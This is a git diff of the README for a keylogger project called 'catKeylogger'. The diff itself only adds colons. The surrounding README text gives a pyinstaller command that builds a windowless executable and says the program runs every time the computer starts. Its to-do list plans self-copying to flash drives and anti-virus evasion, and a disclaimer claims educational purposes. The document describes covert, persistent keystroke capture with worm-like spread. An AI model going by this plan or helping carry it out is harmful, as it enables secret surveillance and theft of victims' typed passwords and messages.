@@ -1,5 +1,5 @@
 # catKeylogger
-For testing purposes
+For testing purposes:
 
 An exe file must first be created using pyinstaller --onefile --noconsole cat.py
 
@@ -15,7 +15,7 @@ Every time the user starts their computer, cat.exe will run
 The developer is not responsible for damage caused through misuse of this program. This program was created for educational purposes.
 
 
-To do
+To do:
 Function to copy cat.exe to any flash drive inserted into the computer
 Reduce usage
 Anti-virus evasion
